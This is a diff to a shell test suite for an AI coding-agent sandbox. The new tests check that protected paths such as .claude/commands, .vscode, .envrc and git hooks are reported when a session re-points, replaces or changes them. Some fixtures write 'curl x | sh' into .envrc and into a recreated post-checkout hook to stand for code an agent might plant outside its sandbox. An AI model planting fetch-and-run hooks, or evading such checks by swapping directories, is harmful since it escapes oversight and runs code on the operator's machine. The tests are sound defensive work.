@@ -21740,7 +21740,7 @@ def fn(name):
     raise SystemExit('missing function ' + name)
 names = ['sha256', 'info', '_sandy_protected_dirs', '_sandy_protected_files',
          '_sandy_overlay_detect_dirs', '_sandy_overlay_detect_agent', '_sandy_tree_fingerprint',
-         '_sandy_agent_has', '_sandy_path_symlink_component', '_sandy_link_hex',
+         '_sandy_agent_has', '_sandy_path_symlink_component', '_sandy_link_hex', '_sandy_path_identity', '_sandy_same_object',
          '_sandy_configured_hooks_rel', '_sandy_extra_hooks_dir', '_sandy_dir_is_inert_git',
          '_sandy_context_hash', '_sandy_df_session_record', '_sandy_slug_for',
          '_sandy_note_session_created_sandy_dir', '_sandy_project_dockerfile_approved']
@@ -29905,13 +29905,13 @@ def fn(name):
     raise SystemExit('missing function ' + name)
 names = ['sha256', 'info', '_sandy_protected_dirs', '_sandy_overlay_detect_dirs',
          '_sandy_overlay_detect_agent', '_sandy_tree_fingerprint', '_sandy_agent_has',
-         '_sandy_path_symlink_component', '_sandy_link_hex',
+         '_sandy_path_symlink_component', '_sandy_link_hex', '_sandy_path_identity', '_sandy_same_object',
          '_sandy_protected_files', '_sandy_configured_hooks_rel', '_sandy_extra_hooks_dir',
          '_sandy_dir_is_inert_git', '_sandy_context_hash', '_sandy_df_session_record',
          '_sandy_slug_for', '_sandy_note_session_created_sandy_dir']
 open(out + '/fns.sh', 'w').write(''.join(fn(n) for n in names))
 a = src.index(': > "$SANDBOX_DIR/.session-created-stubs"\n')
-b = src.index('unset _lnk_snap\n', a) + len('unset _lnk_snap\n')
+b = src.index('unset _lnk_snap _id_snap\n', a) + len('unset _lnk_snap _id_snap\n')
 open(out + '/snap.sh', 'w').write(src[a:b])
 a = src.index('    # Detect protected-path appearances')
 b = src.index('    # #80: .git/HEAD is rw in-container', a)
@@ -30175,6 +30175,82 @@ if command -v git >/dev/null 2>&1; then
                  && printf "%s" "$3" | grep -qF "$4/.vscode/"' _ "$_S245_L" "$_S245_SNAP" "$_S245_OUT" "$_S245_D/P/ws"
 else
     check "§245(17) needs git" bash -c 'exit 77'
+fi
+
+# Identity: an entry recorded as existing is skipped only while it is still
+# the same object. (a) the operator's `.claude -> vendor` link, whose
+# vendor/commands was overlaid at launch, re-pointed in-session.
+mkdir -p "$_S245_D/T/ws/vendor/commands" "$_S245_D/T/ws/other/commands"; ln -s vendor "$_S245_D/T/ws/.claude"
+_S245_L="$(_s245_run T launch claude)"
+_S245_SNAP="$(cat "$_S245_D/T/sb/.protected-existed-at-launch")"
+rm "$_S245_D/T/ws/.claude"; ln -s other "$_S245_D/T/ws/.claude"; printf 'e\n' > "$_S245_D/T/ws/other/commands/e"
+_S245_OUT="$(_s245_run T end claude)"
+check "§245(18) claude session, overlaid .claude/commands reached through .claude -> vendor: re-pointing .claude -> other and writing other/commands/e is reported as RETARGETED with rm .claude (mutation: skipping an existed entry without the identity check prints nothing)" \
+    bash -c 'printf "%s\n" "$3" | grep -qFx ".claude/commands" \
+             && printf "%s" "$1" | grep -qF "$2/.claude -> other  (a link that existed at launch, RETARGETED during this session)" \
+             && printf "%s" "$1" | grep -qF "(cd $2 && rm .claude)"' _ "$_S245_OUT" "$_S245_D/T/ws" "$_S245_SNAP"
+
+# (b) an entry replaced by a different object of the same name: the
+# directory renamed aside (which would carry an overlay or :ro mount away)
+# and recreated, for an overlay dir, a protected dir and a protected file.
+mkdir -p "$_S245_D/U/ws/.claude/commands" "$_S245_D/U/ws/.vscode"
+printf 'mine\n' > "$_S245_D/U/ws/.claude/commands/old.md"; printf '{}\n' > "$_S245_D/U/ws/.vscode/settings.json"
+printf 'use flake\n' > "$_S245_D/U/ws/.envrc"
+_S245_L="$(_s245_run U launch claude)"
+mv "$_S245_D/U/ws/.claude" "$_S245_D/U/ws/.claude-x"; mkdir -p "$_S245_D/U/ws/.claude/commands"; printf 'e\n' > "$_S245_D/U/ws/.claude/commands/e.md"
+mv "$_S245_D/U/ws/.vscode" "$_S245_D/U/ws/.vscode-x"; mkdir "$_S245_D/U/ws/.vscode"; printf '{}\n' > "$_S245_D/U/ws/.vscode/tasks.json"
+mv "$_S245_D/U/ws/.envrc" "$_S245_D/U/ws/.envrc-x"; printf 'curl x | sh\n' > "$_S245_D/U/ws/.envrc"
+_S245_OUT="$(_s245_run U end claude)"
+check "§245(19) an overlay dir, a protected dir and a protected file that existed at launch but were renamed aside and recreated (new inode) are each reported with rm -rf remediation (mutation: a #id that records the canonical path only)" \
+    bash -c 'printf "%s" "$1" | grep -qF "(cd $2 && rm -rf .vscode/ .claude/commands/ .envrc)"' _ "$_S245_OUT" "$_S245_D/U/ws"
+mkdir -p "$_S245_D/U2/ws/.claude/commands" "$_S245_D/U2/ws/.vscode"; printf '{}\n' > "$_S245_D/U2/ws/.vscode/settings.json"
+printf 'mine\n' > "$_S245_D/U2/ws/.claude/commands/old.md"; printf 'use flake\n' > "$_S245_D/U2/ws/.envrc"
+_S245_L="$(_s245_run U2 launch claude)"
+_S245_OUT="$(_s245_run U2 end claude)"
+check "§245(20) ...while the same three, untouched, are not reported (the identity is stable across launch and exit)" \
+    bash -c 'printf "%s" "$1" | grep -q "DRIVE-OK" && ! printf "%s" "$1" | grep -q "Protected paths appeared"' _ "$_S245_OUT"
+
+# A snapshot that lists an entry but holds no #id for it (a broken writer)
+# fails toward a report, never toward "same object".
+mkdir -p "$_S245_D/Y/ws/.claude/commands"; printf 'mine\n' > "$_S245_D/Y/ws/.claude/commands/old.md"
+_S245_L="$(_s245_run Y launch claude)"
+grep -v '^#id	' "$_S245_D/Y/sb/.protected-existed-at-launch" > "$_S245_D/Y/snap.tmp" || true
+mv "$_S245_D/Y/snap.tmp" "$_S245_D/Y/sb/.protected-existed-at-launch"
+_S245_OUT="$(_s245_run Y end claude)"
+check "§245(20b) an entry listed as existing with no #id record is reported (mutation: treating a missing record as the same object)" \
+    bash -c 'printf "%s" "$1" | grep -qF "(cd $2 && rm -rf .claude/commands/)"' _ "$_S245_OUT" "$_S245_D/Y/ws"
+if command -v git >/dev/null 2>&1; then
+    mkdir -p "$_S245_D/X/ws/.githooks"; git -C "$_S245_D/X/ws" init -q 2>/dev/null
+    git -C "$_S245_D/X/ws" config core.hooksPath .githooks; printf '#!/bin/sh\n' > "$_S245_D/X/ws/.githooks/pre-commit"
+    _S245_L="$(_s245_run X launch)"
+    mv "$_S245_D/X/ws/.githooks" "$_S245_D/X/ws/.githooks-x"; mkdir "$_S245_D/X/ws/.githooks"
+    printf '#!/bin/sh\ncurl x | sh\n' > "$_S245_D/X/ws/.githooks/post-checkout"
+    _S245_OUT="$(_s245_run X end)"
+    check "§245(20c) a core.hooksPath dir that existed at launch, renamed aside and recreated, is reported (mutation: the hooksPath skip without the identity check)" \
+        bash -c 'printf "%s" "$1" | grep -qF "(cd $2 && rm -rf .githooks/)"' _ "$_S245_OUT" "$_S245_D/X/ws"
+else
+    check "§245(20c) needs git" bash -c 'exit 77'
+fi
+
+# Fingerprint lows: a mode change, and a file it cannot read.
+mkdir -p "$_S245_D/V/ws/.claude/commands"; printf 'echo hi\n' > "$_S245_D/V/ws/.claude/commands/run.sh"
+_S245_L="$(_s245_run V launch codex)"
+chmod +x "$_S245_D/V/ws/.claude/commands/run.sh"
+_S245_OUT="$(_s245_run V end codex)"
+check "§245(21) chmod +x on a file in a no-overlay dir is reported (mutation: a fingerprint without the mode)" \
+    bash -c 'printf "%s" "$1" | grep -qF "$2/.claude/commands/ (existed at launch with no sandbox overlay"' _ "$_S245_OUT" "$_S245_D/V/ws"
+if [ "$(id -u)" != 0 ]; then
+    mkdir -p "$_S245_D/W/ws/.claude/commands"; printf 'x\n' > "$_S245_D/W/ws/.claude/commands/a.md"
+    chmod 000 "$_S245_D/W/ws/.claude/commands/a.md"
+    _S245_L="$(_s245_run W launch codex)"
+    _S245_SNAP="$(cat "$_S245_D/W/sb/.protected-existed-at-launch")"
+    _S245_OUT="$(_s245_run W end codex)"
+    chmod 600 "$_S245_D/W/ws/.claude/commands/a.md"
+    check "§245(22) a no-overlay dir holding a file it cannot read is unhashable and reported (mutation: dropping the status of the finds)" \
+        bash -c 'printf "%s\n" "$3" | grep -q "^#content	.claude/commands	unhashable$" \
+                 && printf "%s" "$1" | grep -qF "$2/.claude/commands/ (existed at launch with no sandbox overlay"' _ "$_S245_OUT" "$_S245_D/W/ws" "$_S245_SNAP"
+else
+    check "§245(22) a file it cannot read: needs a non-root user (root reads mode 000)" bash -c 'exit 77'
 fi
 rm -rf "$_S245_D"
 unset _S245_D _S245_L _S245_OUT _S245_SNAP _s245_p _s245_bad
